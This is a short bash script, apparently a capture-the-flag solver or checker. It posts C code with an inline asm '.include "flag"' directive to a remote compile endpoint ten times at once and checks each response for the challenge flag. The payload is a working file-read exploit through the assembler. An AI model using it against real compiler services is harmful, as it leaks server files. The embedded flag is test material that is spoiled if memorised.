#!/bin/bash

for x in {1..10}; do
  curl 'https://smuggler-tlejfksioa-ul.a.run.app/compile' \
    --data-raw 'code=%0D%0Aint+main%28%29+%7B%0D%0A++asm%28%0D%0A++++%22.include+%5C%22flag%5C%22%22%0D%0A++%29%3B%0D%0A++return+0%3B%0D%0A%7D%0D%0A' \
    --compressed 2>/dev/null | grep "wctf{4553mb1y_15nt_ju5t_u53d_f0r_r3v}" > /dev/null 2>&1 || { echo "fail"; exit 1; } &
done
